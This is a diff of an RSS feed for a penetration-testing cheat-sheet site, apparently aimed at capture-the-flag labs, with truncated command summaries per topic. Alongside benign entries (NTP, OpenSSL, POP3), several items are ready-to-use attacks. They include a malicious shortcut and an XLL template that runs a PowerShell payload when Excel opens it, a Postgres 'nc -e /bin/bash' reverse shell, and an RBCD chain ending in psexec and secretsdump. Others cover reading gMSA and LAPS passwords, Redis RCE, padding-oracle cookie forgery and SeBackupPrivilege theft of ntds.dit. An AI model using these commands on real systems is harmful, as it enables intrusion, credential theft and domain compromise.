     </item>
     <item>
       <title>NTP</title>
       <link>https://tldrbins.github.io/ntp/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       <guid>https://tldrbins.github.io/ntp/</guid>
-      <description> Check Server Time sudo nmap -sU -sV --script &amp;#34;ntp* and (discovery or vuln) and not (dos or brute)&amp;#34; -p 123 10.10.11.10 Check Time Skew date; ntpdate -q 10.10.11.10 Update Time Fix ntpdate from doing nothing sudo apt install chrony sudo timedatectl set-ntp true sudo ntpdate -s 10.10.11.10 Using faketime # After getting the time skew faketime -f +9999s &amp;lt;COMMAND&amp;gt; # Get from http server faketime &amp;#34;$(curl -sI http://example.com | grep &amp;#39;Date:&amp;#39; | awk -F &amp;#39;Date:&amp;#39; &amp;#39;{print $2}&amp;#39;)&amp;#34; </description>
+      <description> Check Server Time sudo nmap -sU -sV --script &amp;#34;ntp* and (discovery or vuln) and not (dos or brute)&amp;#34; -p 123 10.10.11.10 Check Time Skew date; ntpdate -q 10.10.11.10 Update Time ntpdate faketime Fix ntpdate from doing nothing sudo apt install chrony sudo timedatectl set-ntp true sudo ntpdate -s 10.10.11.10 # After getting the time skew faketime -f +9999s &amp;lt;COMMAND&amp;gt; # Get from http server faketime &amp;#34;$(curl -sI http://example.com | grep &amp;#39;Date:&amp;#39; | awk -F &amp;#39;Date:&amp;#39; &amp;#39;{print $2}&amp;#39;)&amp;#34; </description>
     </item>
     <item>
       <title>Openssl</title>
       <link>https://tldrbins.github.io/openssl/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       <guid>https://tldrbins.github.io/openssl/</guid>
-      <description>Show TLS Certificate echo | openssl s_client -showcerts -servername 10.10.11.10 -connect 10.10.11.10:443 2&amp;gt;/dev/null | openssl x509 -inform pem -noout -text Base64 Encode/Decode # base64 encode a file openssl base64 -in ./file # base64 decode a file and output to a file cat b64_file | openssl enc -d -base64 -out ./file Certificate Show content of a request openssl req -in request.csr -noout -text Create Client Certificate # Generate a user key openssl genrsa -out username.</description>
+      <description>Show TLS Certificate from HTTPS web server echo | openssl s_client -showcerts -servername 10.10.11.10 -connect 10.10.11.10:443 2&amp;gt;/dev/null | openssl x509 -inform pem -noout -text Certificate Show content of a request openssl req -in request.csr -noout -text Create Client Certificate # Generate a user key openssl genrsa -out username.key 2048 # Create a CSR openssl req -new -key username.key -out username.csr # Settings +-----------------------------------------------------------------------------+ | You are about to be asked to enter information that will be incorporated | | into your certificate request.</description>
     </item>
     <item>
       <title>openvpn</title>
@@ -740,28 +726,28 @@
       <link>https://tldrbins.github.io/oracle/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       <guid>https://tldrbins.github.io/oracle/</guid>
-      <description>Tools sqlplus # Install sudo apt install oracle-instantclient-sqlplus # export LD_LIBRARY_PATH export LD_LIBRARY_PATH=/usr/lib/oracle/19.6/client64/lib${LD_LIBRARY_PATH:+:$LD_LIBRARY_PATH} # Check sqlplus -V ODAT (Oracle Database Attacking Tool) Download ODAT&#xA;# Install sudo apt install odat # Check odat --version Enum # SID enum (You only need one) odat sidguesser -s 10.10.11.10 # User/Password brute force odat passwordguesser -s 10.10.11.10 -d &amp;lt;SID&amp;gt; --accounts-file accounts.txt # Run all checks with creds as sysdba odat all -s 10.</description>
+      <description>Tools sqlplus ODAT # Install sudo apt install oracle-instantclient-sqlplus # export LD_LIBRARY_PATH export LD_LIBRARY_PATH=/usr/lib/oracle/19.6/client64/lib${LD_LIBRARY_PATH:+:$LD_LIBRARY_PATH} # Check sqlplus -V # Install sudo apt install odat # Check odat --version Ref: Download ODAT&#xA;Enum # SID enum (You only need one) odat sidguesser -s 10.10.11.10 # User/Password brute force odat passwordguesser -s 10.10.11.10 -d &amp;lt;SID&amp;gt; --accounts-file accounts.txt # Run all checks with creds as sysdba odat all -s 10.10.11.10 -U &amp;lt;USER&amp;gt; -P &amp;lt;PASSWORD&amp;gt; -d &amp;lt;SID&amp;gt; --sysdba General # Export everytime or add to ~/.</description>
     </item>
     <item>
       <title>Padding Oracle</title>
       <link>https://tldrbins.github.io/padding_oracle/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       <guid>https://tldrbins.github.io/padding_oracle/</guid>
-      <description> padbuster Download padbuster&#xA;# 8 or 16 : block size # encoding 0 : base64 padbuster http://10.10.11.10/index.php &amp;lt;COOKIE_VALUE&amp;gt; 8 -cookies &amp;lt;COOKIE_NAME&amp;gt;=&amp;lt;COOKIE_VALUE&amp;gt; -encoding 0 # Forge cookie value, e.g. user=admin padbuster http://10.10.11.10/index.php &amp;lt;COOKIE_VALUE&amp;gt; 8 -cookies &amp;lt;COOKIE_NAME&amp;gt;=&amp;lt;COOKIE_VALUE&amp;gt; -encoding 0 -plaintext user=admin </description>
+      <description>Tools padbuster # 8 or 16 : block size # encoding 0 : base64 padbuster http://10.10.11.10/index.php &amp;lt;COOKIE_VALUE&amp;gt; 8 -cookies &amp;lt;COOKIE_NAME&amp;gt;=&amp;lt;COOKIE_VALUE&amp;gt; -encoding 0 # Forge cookie value, e.g. user=admin padbuster http://10.10.11.10/index.php &amp;lt;COOKIE_VALUE&amp;gt; 8 -cookies &amp;lt;COOKIE_NAME&amp;gt;=&amp;lt;COOKIE_VALUE&amp;gt; -encoding 0 -plaintext user=admin Ref: Download padbuster</description>
     </item>
     <item>
       <title>Password Cracking</title>
       <link>https://tldrbins.github.io/password_cracking/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       <guid>https://tldrbins.github.io/password_cracking/</guid>
-      <description>john Convert file to john hash format # For example ssh2john id_rsa_encrypted &amp;gt; hash keepass2john test.kdbx &amp;gt; hash zip2john test.zip &amp;gt; hash # Get a full list of *2john find / -name *2john 2&amp;gt;/dev/null Basic # General use john --wordlist=/usr/share/wordlists/rockyou.txt hash # Specify hash format john --wordlist=/usr/share/wordlists/rockyou.txt hash --format=Raw-SHA512 # Show cracked hash john --show hash # Show cracked hash with specific format john --show hash --format=Raw-SHA512 hashcat Example Hashes</description>
+      <description>Convert file to hash format # For example ssh2john id_rsa_encrypted &amp;gt; hash keepass2john test.kdbx &amp;gt; hash zip2john test.zip &amp;gt; hash # Get a full list of *2john find / -name *2john 2&amp;gt;/dev/null john hashcat # General use john --wordlist=/usr/share/wordlists/rockyou.txt hash # Specify hash format john --wordlist=/usr/share/wordlists/rockyou.txt hash --format=Raw-SHA512 # Show cracked hash john --show hash # Show cracked hash with specific format john --show hash --format=Raw-SHA512 # Auto detect hash format hashcat hash # Specify hash format hashcat -m 13400 -a 0 hash /usr/share/wordlists/rockyou.</description>
     </item>
     <item>
       <title>Phishing</title>
       <link>https://tldrbins.github.io/phishing/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       <guid>https://tldrbins.github.io/phishing/</guid>
-      <description>Abuse #1: Create a malicious .lnk $obj = New-Object -ComObject WScript.Shell $link = $obj.CreateShortcut(&amp;#34;C:\ProgramData\Calculator.lnk&amp;#34;) $link.TargetPath = &amp;#34;C:\ProgramData\rev.exe&amp;#34; $link.Save() Abuse #2: Phishing with XLL (Excel) revshells.com&#xA;shell.c #include &amp;lt;windows.h&amp;gt; __declspec(dllexport) void __cdecl xlAutoOpen(void); void __cdecl xlAutoOpen() { // Triggers when Excel opens WinExec(&amp;#34;&amp;lt;PowerShell #3 Base64 Payload&amp;gt;&amp;#34;, 1); // Replace your payload } BOOL APIENTRY DllMain( HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved ) { switch (ul_reason_for_call) { case DLL_PROCESS_ATTACH: case DLL_THREAD_ATTACH: case DLL_THREAD_DETACH: case DLL_PROCESS_DETACH: break; } return TRUE; } 1.</description>
+      <description>lnk xll hta scf odt pdf others $obj = New-Object -ComObject WScript.Shell $link = $obj.CreateShortcut(&amp;#34;C:\ProgramData\Calculator.lnk&amp;#34;) $link.TargetPath = &amp;#34;C:\ProgramData\rev.exe&amp;#34; $link.Save() shell.c #include &amp;lt;windows.h&amp;gt; __declspec(dllexport) void __cdecl xlAutoOpen(void); void __cdecl xlAutoOpen() { // Triggers when Excel opens WinExec(&amp;#34;&amp;lt;PowerShell #3 Base64 Payload&amp;gt;&amp;#34;, 1); // Replace your payload } BOOL APIENTRY DllMain( HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved ) { switch (ul_reason_for_call) { case DLL_PROCESS_ATTACH: case DLL_THREAD_ATTACH: case DLL_THREAD_DETACH: case DLL_PROCESS_DETACH: break; } return TRUE; } 1.</description>
     </item>
     <item>
       <title>PHP Command Shell</title>
@@ -782,21 +768,21 @@
       <link>https://tldrbins.github.io/pop3/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       <guid>https://tldrbins.github.io/pop3/</guid>
-      <description> POP3 # Connect to POP3 mail server telnet 10.10.11.10 110 # Send cmd after +OK USER &amp;lt;USER&amp;gt; PASS &amp;lt;PASSWORD&amp;gt; # List all mails LIST # Retrieve mail #1 RETR 1 # Exit Ctrl + ], then quit </description>
+      <description> Basic # Connect to POP3 mail server telnet 10.10.11.10 110 # Send cmd after +OK USER &amp;lt;USER&amp;gt; PASS &amp;lt;PASSWORD&amp;gt; # List all mails LIST # Retrieve mail #1 RETR 1 # Exit Ctrl + ], then quit </description>
     </item>
     <item>
       <title>Port Knocking</title>
       <link>https://tldrbins.github.io/port_knocking/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       <guid>https://tldrbins.github.io/port_knocking/</guid>
-      <description> knockd # Find knock sequence cat /etc/knockd.conf # For example, sequence = 123, 456, 789 for i in 123 456 789; do nmap -Pn --host-timeout 100 --max-retries 0 -p $i 10.10.11.10 &amp;gt;/dev/null; done; ssh -i id_rsa &amp;lt;USER&amp;gt;@10.10.11.10 # UDP port knocking for i in 123 456 789; do sudo nmap -Pn -sU --host-timeout 100 --max-retries 0 -p $i 10.10.11.10 &amp;gt;/dev/null; done; ssh -i id_rsa &amp;lt;USER&amp;gt;@10.10.11.10 </description>
+      <description> knockd config location # Find knock sequence cat /etc/knockd.conf TCP UDP # For example, sequence = 123, 456, 789 for i in 123 456 789; do nmap -Pn --host-timeout 100 --max-retries 0 -p $i 10.10.11.10 &amp;gt;/dev/null; done; ssh -i id_rsa &amp;lt;USER&amp;gt;@10.10.11.10 # UDP port knocking for i in 123 456 789; do sudo nmap -Pn -sU --host-timeout 100 --max-retries 0 -p $i 10.10.11.10 &amp;gt;/dev/null; done; ssh -i id_rsa &amp;lt;USER&amp;gt;@10.10.11.10 </description>
     </item>
     <item>
       <title>Postgresql</title>
       <link>https://tldrbins.github.io/postgresql/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       <guid>https://tldrbins.github.io/postgresql/</guid>
-      <description>General Connect to postgresql Database psql -h 127.0.0.1 -U &amp;lt;USER&amp;gt; -p 5432 -d &amp;lt;DB_NAME&amp;gt; psql postgresql://&amp;lt;USER&amp;gt;:&amp;lt;PASSWORD&amp;gt;@localhost:5432/&amp;lt;DB_NAME&amp;gt; Basic Commands # Show databases \list # Use database \connect &amp;lt;DB_NAME&amp;gt; # Show tables in current database \dt # Dump data from table select * from &amp;lt;TABLE_NAME&amp;gt;; # Insert data into table (e.g) insert into &amp;lt;TABLE_NAME&amp;gt; (username, password, role) values (&amp;#39;user&amp;#39;, &amp;#39;password&amp;#39;, &amp;#39;admin&amp;#39;); # Write text copy (select &amp;#39;test&amp;#39;) to &amp;#39;/var/lib/postgresql/.profile&amp;#39;; # Exit \q RCE # Only superuser CREATE TABLE IF NOT EXISTS exec(string text); COPY exec FROM PROGRAM &amp;#39;nc -e /bin/bash 10.</description>
+      <description>Connect psql -h 127.0.0.1 -U &amp;lt;USER&amp;gt; -p 5432 -d &amp;lt;DB_NAME&amp;gt; psql postgresql://&amp;lt;USER&amp;gt;:&amp;lt;PASSWORD&amp;gt;@localhost:5432/&amp;lt;DB_NAME&amp;gt; Basic # Show databases \list # Use database \connect &amp;lt;DB_NAME&amp;gt; # Show tables in current database \dt # Dump data from table select * from &amp;lt;TABLE_NAME&amp;gt;; # Insert data into table (e.g) insert into &amp;lt;TABLE_NAME&amp;gt; (username, password, role) values (&amp;#39;user&amp;#39;, &amp;#39;password&amp;#39;, &amp;#39;admin&amp;#39;); # Write text copy (select &amp;#39;test&amp;#39;) to &amp;#39;/var/lib/postgresql/.profile&amp;#39;; # Exit \q RCE # Only superuser CREATE TABLE IF NOT EXISTS exec(string text); COPY exec FROM PROGRAM &amp;#39;nc -e /bin/bash 10.</description>
     </item>
     <item>
       <title>Pypi</title>
@@ -810,7 +796,7 @@
       <link>https://tldrbins.github.io/python_decompile/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       <guid>https://tldrbins.github.io/python_decompile/</guid>
-      <description> pyinstxtractor # Unpack pyinstaller packed binary pyinstxtractor test.elf uncompyle6 # Install pip3 install uncompyle6 # Run (need .pyc extension) uncompyle6 script.pyc pycdc Installation pycdc&#xA;git clone https://github.com/zrax/pycdc.git cd pycdc cmake . make make check Run ./pycdc script.pyc </description>
+      <description>Tools pyinstxtractor uncompyle6 pycdc # Unpack pyinstaller packed binary pyinstxtractor test.elf # Install pip3 install uncompyle6 # Run (need .pyc extension) uncompyle6 script.pyc # Install git clone https://github.com/zrax/pycdc.git cd pycdc cmake . make make check # Run ./pycdc script.pyc Ref: pycdc</description>
     </item>
     <item>
       <title>rbash</title>
@@ -824,28 +810,28 @@
       <link>https://tldrbins.github.io/rbcd/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       <guid>https://tldrbins.github.io/rbcd/</guid>
-      <description>RBCD Attack (From Linux) 0. Check machine account quota nxc ldap 10.10.11.10 -u &amp;lt;USER&amp;gt; -p &amp;lt;PASSWORD&amp;gt; -M MAQ 1. Add a fake computer impacket-addcomputer -computer-name &amp;#39;EvilComputer&amp;#39; -computer-pass &amp;#39;password&amp;#39; -dc-ip 10.10.11.10 &amp;lt;DOMAIN&amp;gt;/&amp;lt;USER&amp;gt;:&amp;lt;PASSWORD&amp;gt; 2. Rbcd attack impacket-rbcd -delegate-to &amp;lt;TARGET_COMPUTER&amp;gt;$ -delegate-from EvilComputer$ -dc-ip &amp;lt;DC&amp;gt; -action &amp;#39;write&amp;#39; &amp;lt;DOMAIN&amp;gt;/&amp;lt;USER&amp;gt;:&amp;lt;PASSWORD&amp;gt; 3. Impersonate sudo ntpdate -s &amp;lt;DC&amp;gt; &amp;amp;&amp;amp; impacket-getST -spn cifs/&amp;lt;TARGET_DOMAIN&amp;gt; -impersonate administrator -dc-ip &amp;lt;DC&amp;gt; &amp;#39;&amp;lt;DOMAIN&amp;gt;/EvilComputer:password&amp;#39; 4. Import ticket export KRB5CCNAME=administrator@cifs_&amp;lt;TARGET_DOMAIN&amp;gt;@&amp;lt;DOMAIN&amp;gt;.ccache 5. Post-Attack # Remote sudo ntpdate -s &amp;lt;DC&amp;gt; &amp;amp;&amp;amp; impacket-psexec &amp;lt;DOMAIN&amp;gt;/administrator@&amp;lt;TARGET_DOMAIN&amp;gt; -k -no-pass # Or secretsdump impacket-secretsdump administrator@&amp;lt;TARGET_DOMAIN&amp;gt; -k -no-pass -just-dc-user Administrator RBCD Attack (From Windows) 1.</description>
+      <description>RBCD Attack Linux Windows 0. Check machine account quota nxc ldap 10.10.11.10 -u &amp;lt;USER&amp;gt; -p &amp;lt;PASSWORD&amp;gt; -M MAQ 1. Add a fake computer impacket-addcomputer -computer-name &amp;#39;EvilComputer&amp;#39; -computer-pass &amp;#39;password&amp;#39; -dc-ip 10.10.11.10 &amp;lt;DOMAIN&amp;gt;/&amp;lt;USER&amp;gt;:&amp;lt;PASSWORD&amp;gt; 2. Rbcd attack impacket-rbcd -delegate-to &amp;lt;TARGET_COMPUTER&amp;gt;$ -delegate-from EvilComputer$ -dc-ip &amp;lt;DC&amp;gt; -action &amp;#39;write&amp;#39; &amp;lt;DOMAIN&amp;gt;/&amp;lt;USER&amp;gt;:&amp;lt;PASSWORD&amp;gt; 3. Impersonate sudo ntpdate -s &amp;lt;DC&amp;gt; &amp;amp;&amp;amp; impacket-getST -spn cifs/&amp;lt;TARGET_DOMAIN&amp;gt; -impersonate administrator -dc-ip &amp;lt;DC&amp;gt; &amp;#39;&amp;lt;DOMAIN&amp;gt;/EvilComputer:password&amp;#39; 4. Import ticket export KRB5CCNAME=administrator@cifs_&amp;lt;TARGET_DOMAIN&amp;gt;@&amp;lt;DOMAIN&amp;gt;.ccache 5. Post-Attack # Remote sudo ntpdate -s &amp;lt;DC&amp;gt; &amp;amp;&amp;amp; impacket-psexec &amp;lt;DOMAIN&amp;gt;/administrator@&amp;lt;TARGET_DOMAIN&amp;gt; -k -no-pass # Or secretsdump impacket-secretsdump administrator@&amp;lt;TARGET_DOMAIN&amp;gt; -k -no-pass -just-dc-user Administrator 1.</description>
     </item>
     <item>
       <title>ReadGMSAPassword</title>
       <link>https://tldrbins.github.io/readgmsapassword/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       <guid>https://tldrbins.github.io/readgmsapassword/</guid>
-      <description> Abuse #1: Read GMSAPassword (From Linux) gMSADumper gMSADumper&#xA;python3 gMSADumper.py -u &amp;lt;USER&amp;gt; -p &amp;lt;PASSWORD&amp;gt; -l &amp;lt;TARGET&amp;gt; -d &amp;lt;DOMAIN&amp;gt; bloodAD bloodyAD&#xA;python3 bloodyAD.py -d &amp;lt;DOMAIN&amp;gt; -u &amp;lt;USER&amp;gt; -p &amp;lt;PASSWORD&amp;gt; --host &amp;lt;DC&amp;gt; get object &amp;lt;TARGET_OBJECT&amp;gt; --attr msDS-ManagedPassword Abuse #2: Save as Cred (From Windows) $gmsa = Get-ADServiceAccount -Identity &amp;lt;TARGET_NAME&amp;gt; -Properties &amp;#39;msDS-ManagedPassword&amp;#39; $mp = $gmsa.&amp;#39;msDS-ManagedPassword&amp;#39; $password = (ConvertFrom-ADManagedPasswordBlob $mp).CurrentPassword $SecPass = (ConvertFrom-ADManagedPasswordBlob $mp).SecureCurrentPassword $cred = New-Object System.Management.Automation.PSCredential &amp;lt;TARGET_NAME&amp;gt;, $SecPass # For example, change password of another target user Invoke-Command -ComputerName &amp;lt;COMPUTER_NAME&amp;gt; -ScriptBlock {Set-ADAccountPassword -Identity &amp;lt;ANOTHER_TARGET_NAME&amp;gt; -reset -NewPassword (ConvertTo-SecureString -AsPlainText &amp;#39;&amp;lt;PASSWORD&amp;gt;&amp;#39; -force)} -Credential $cred </description>
+      <description>Abuse #1: Read GMSAPassword (From Linux) gMSADumper BloodyAD nxc python3 gMSADumper.py -u &amp;lt;USER&amp;gt; -p &amp;lt;PASSWORD&amp;gt; -l &amp;lt;TARGET&amp;gt; -d &amp;lt;DOMAIN&amp;gt; Ref: gMSADumper&#xA;python3 bloodyAD.py -d &amp;lt;DOMAIN&amp;gt; -u &amp;lt;USER&amp;gt; -p &amp;lt;PASSWORD&amp;gt; --host &amp;lt;DC&amp;gt; get object &amp;lt;TARGET_OBJECT&amp;gt; --attr msDS-ManagedPassword Ref: bloodyAD&#xA;nxc ldap -u &amp;lt;USER&amp;gt; -p &amp;lt;PASSWORD&amp;gt; -d &amp;lt;DOMAIN&amp;gt; &amp;lt;TARGET&amp;gt; --gmsa Abuse #2: Save as Cred Windows $gmsa = Get-ADServiceAccount -Identity &amp;lt;TARGET_NAME&amp;gt; -Properties &amp;#39;msDS-ManagedPassword&amp;#39; $mp = $gmsa.&amp;#39;msDS-ManagedPassword&amp;#39; $password = (ConvertFrom-ADManagedPasswordBlob $mp).CurrentPassword $SecPass = (ConvertFrom-ADManagedPasswordBlob $mp).</description>
     </item>
     <item>
       <title>ReadLAPSPassword</title>
       <link>https://tldrbins.github.io/readlapspassword/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       <guid>https://tldrbins.github.io/readlapspassword/</guid>
-      <description> Abuse #1: Read LAPS password (From Windows) 1. Import PowerView.ps1 . .\PowerView.ps1 2. Create cred object (runas) [optional] $username = &amp;#34;&amp;lt;DOMAIN&amp;gt;\&amp;lt;USER&amp;gt;&amp;#34; $password = ConvertTo-SecureString &amp;lt;PASSWORD&amp;gt; -AsPlainText -Force $cred = new-object -typename System.Management.Automation.PSCredential -argumentlist $username, $password 3. Read LAPS password Get-AdComputer -Filter * -Properties ms-Mcs-AdmPwd -Credential $cred Abuse #1: Read LAPS Password (From Linux) ldapsearch -h 10.10.11.10 -b &amp;#39;DC=&amp;lt;,example&amp;gt;,DC=&amp;lt;com&amp;gt;&amp;#39; -x -D &amp;lt;USER&amp;gt;@&amp;lt;TARGET&amp;gt; -w &amp;lt;PASSWORD&amp;gt; &amp;#34;(ms-MCS-AdmPwd=*)&amp;#34; ms-MCS-AdmPwd </description>
+      <description> Abuse #1: Read LAPS Password Linux Windows ldapsearch -h 10.10.11.10 -b &amp;#39;DC=&amp;lt;,example&amp;gt;,DC=&amp;lt;com&amp;gt;&amp;#39; -x -D &amp;lt;USER&amp;gt;@&amp;lt;TARGET&amp;gt; -w &amp;lt;PASSWORD&amp;gt; &amp;#34;(ms-MCS-AdmPwd=*)&amp;#34; ms-MCS-AdmPwd 1. Import PowerView.ps1 . .\PowerView.ps1 2. Create cred object (runas) [optional] $username = &amp;#34;&amp;lt;DOMAIN&amp;gt;\&amp;lt;USER&amp;gt;&amp;#34; $password = ConvertTo-SecureString &amp;lt;PASSWORD&amp;gt; -AsPlainText -Force $cred = new-object -typename System.Management.Automation.PSCredential -argumentlist $username, $password 3. Read LAPS password Get-AdComputer -Filter * -Properties ms-Mcs-AdmPwd -Credential $cred </description>
     </item>
     <item>
       <title>Redis</title>
       <link>https://tldrbins.github.io/redis/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       <guid>https://tldrbins.github.io/redis/</guid>
-      <description>Basic Commands # Connect redis-cli -h 127.0.0.1 # Provide password auth &amp;lt;PASSWORD&amp;gt; # List current keys keys * # Add key incr key # Get key value get key Abuse #1: Arbitrary write to RCE (echo -e &amp;#34;\n\n&amp;#34;; cat id_rsa.pub; echo -e &amp;#34;\n\n&amp;#34;) &amp;gt; foo.txt # Deletes all keys from all databases on current host redis-cli -h 127.0.0.1 flushall cat foo.txt | redis-cli -h 127.0.0.1 -x set crackit redis-cli -h 127.</description>
+      <description>Basic # Connect redis-cli -h 127.0.0.1 # Provide password auth &amp;lt;PASSWORD&amp;gt; # List current keys keys * # Add key incr key # Get key value get key Abuse #1: Arbitrary write to RCE (echo -e &amp;#34;\n\n&amp;#34;; cat id_rsa.pub; echo -e &amp;#34;\n\n&amp;#34;) &amp;gt; foo.txt # Deletes all keys from all databases on current host redis-cli -h 127.0.0.1 flushall cat foo.txt | redis-cli -h 127.0.0.1 -x set crackit redis-cli -h 127.</description>
     </item>
     <item>
       <title>Retrieve Flask Debug Pin</title>
@@ -859,7 +845,7 @@
       <link>https://tldrbins.github.io/rpc/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       <guid>https://tldrbins.github.io/rpc/</guid>
-      <description> rpcclient # Connect without creds rpcclient -U &amp;#39;&amp;#39; -N 10.10.11.10 # Connect with creds rpcclient -U &amp;lt;DOMAIN&amp;gt;/&amp;lt;USER&amp;gt;%&amp;lt;PASSWORD&amp;gt; 10.10.11.10 # Inline execute command rpcclient -U &amp;lt;DOMAIN&amp;gt;/&amp;lt;USER&amp;gt;%&amp;lt;PASSWORD&amp;gt; 10.10.11.10 -c &amp;#39;querydispinfo&amp;#39; Basic Commands # General info querydispinfo # List of users enumdomusers # List of groups enumdomgroups # Query group by rid querygroup &amp;lt;RID&amp;gt; # Query group member by rid querygroupmem &amp;lt;RID&amp;gt; # Query user by rid queryuser &amp;lt;RID&amp;gt; # Look up a user lookupnames &amp;lt;USER&amp;gt; # Look up by SID lookupsids &amp;lt;SID&amp;gt; impacket-lookupsid impacket-lookupsid &amp;lt;USER&amp;gt;:&amp;lt;PASSWORD&amp;gt;@&amp;lt;TARGET&amp;gt; </description>
+      <description> Remote Procedure Call Tools rpcclient impacket # Connect without creds rpcclient -U &amp;#39;&amp;#39; -N 10.10.11.10 # Connect with creds rpcclient -U &amp;lt;DOMAIN&amp;gt;/&amp;lt;USER&amp;gt;%&amp;lt;PASSWORD&amp;gt; 10.10.11.10 # Inline execute command rpcclient -U &amp;lt;DOMAIN&amp;gt;/&amp;lt;USER&amp;gt;%&amp;lt;PASSWORD&amp;gt; 10.10.11.10 -c &amp;#39;querydispinfo&amp;#39; Basic Commands # General info querydispinfo # List of users enumdomusers # List of groups enumdomgroups # Query group by rid querygroup &amp;lt;RID&amp;gt; # Query group member by rid querygroupmem &amp;lt;RID&amp;gt; # Query user by rid queryuser &amp;lt;RID&amp;gt; # Look up a user lookupnames &amp;lt;USER&amp;gt; # Look up by SID lookupsids &amp;lt;SID&amp;gt; impacket-lookupsid &amp;lt;USER&amp;gt;:&amp;lt;PASSWORD&amp;gt;@&amp;lt;TARGET&amp;gt; </description>
     </item>
     <item>
       <title>rsync</title>
@@ -873,14 +859,14 @@
       <link>https://tldrbins.github.io/runas/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       <guid>https://tldrbins.github.io/runas/</guid>
-      <description>Runas (with cred object) Create cred object (Method #1) $username = &amp;#34;&amp;lt;DOMAIN&amp;gt;\&amp;lt;USER&amp;gt;&amp;#34; $password = &amp;#34;&amp;lt;PASSWORD&amp;gt;&amp;#34; $secstr = New-Object -TypeName System.Security.SecureString $password.ToCharArray() | ForEach-Object {$secstr.AppendChar($_)} $cred = new-object -typename System.Management.Automation.PSCredential -argumentlist $username, $secstr Create cred object (Method #2) $password = ConvertTo-SecureString &amp;#34;&amp;lt;PASSWORD&amp;gt;&amp;#34; -AsPlainText -Force $cred = New-Object System.Management.Automation.PSCredential(&amp;#34;&amp;lt;DOMAIN&amp;gt;\&amp;lt;USER&amp;gt;&amp;#34;, $password) Run Commnad Invoke-Command -ScriptBlock { C:\ProgramData\rev.exe } -Credential $cred -Computer localhost # If error, try Invoke-Command -ScriptBlock { C:\ProgramData\rev.exe } -Credential $cred -Computer localhost -auth credssp # Invoke command with config Invoke-Command -ScriptBlock { C:\ProgramData\rev.</description>
+      <description>Create credential object Method #1 Method #2 $username = &amp;#39;&amp;lt;DOMAIN&amp;gt;\&amp;lt;USER&amp;gt;&amp;#39; $password = ConvertTo-SecureString &amp;#39;&amp;lt;PASSWORD&amp;gt;&amp;#39; -AsPlainText -Force $cred = New-Object System.Management.Automation.PSCredential($username, $password) $username = &amp;#39;&amp;lt;DOMAIN&amp;gt;\&amp;lt;USER&amp;gt;&amp;#39; $password = &amp;#39;&amp;lt;PASSWORD&amp;gt;&amp;#39; $secstr = New-Object -TypeName System.Security.SecureString $password.ToCharArray() | ForEach-Object {$secstr.AppendChar($_)} $cred = new-object -typename System.Management.Automation.PSCredential -argumentlist $username, $secstr Runas (with cred object) Invoke-Command PSSession Invoke-Command -ScriptBlock { C:\ProgramData\rev.exe } -Credential $cred -Computer localhost # If error, try Invoke-Command -ScriptBlock { C:\ProgramData\rev.exe } -Credential $cred -Computer localhost -auth credssp # Invoke command with config Invoke-Command -ScriptBlock { C:\ProgramData\rev.</description>
     </item>
     <item>
       <title>Scheduled tasks</title>
       <link>https://tldrbins.github.io/scheduled_tasks_windows/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       <guid>https://tldrbins.github.io/scheduled_tasks_windows/</guid>
-      <description> Check scheduled tasks schtasks /query # List details schtasks /TN \Microsoft\Windows\&amp;lt;FOLDER&amp;gt;\&amp;lt;TASKNAME&amp;gt; /FO LIST /V </description>
+      <description> Check scheduled tasks Windows schtasks /query # List details schtasks /TN \Microsoft\Windows\&amp;lt;FOLDER&amp;gt;\&amp;lt;TASKNAME&amp;gt; /FO LIST /V </description>
     </item>
     <item>
       <title>Searchsploit</title>
@@ -894,42 +880,42 @@
       <link>https://tldrbins.github.io/sebackupprivilege/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       <guid>https://tldrbins.github.io/sebackupprivilege/</guid>
-      <description>Abuse #1: Robocopy # For example robocopy /b &amp;lt;TARGET_DIR_PATH&amp;gt; C:\Windows\Tasks &amp;lt;TARGET_FILE&amp;gt; Abuse #2: Using helper dlls SeBackupPrivilegeUtils.dll&#xA;SeBackupPrivilegeCmdLets.dll&#xA;import-module .\SeBackupPrivilegeCmdLets.dll import-module .\SeBackupPrivilegeUtils.dll Copy-FileSeBackupPrivilege &amp;lt;TARGET_FILE_PATH&amp;gt; C:\ProgramData\&amp;lt;TARGET_FILE&amp;gt; # For example Copy-FileSeBackupPrivilege C:\Windows\ntds\ntds.dit C:\ProgramData\ntds.dit Abuse #3: Diskshadow 1. Create a .dsh file set context persistent nowriters set metadata C:\ProgramData\test.cab set verbose on add volume c: alias test create expose %test% x: # Convert to dos format unix2dos vss.dsh 2. Run vss.dsh # Upload and run diskshadow /s C:\ProgramData\vss.</description>
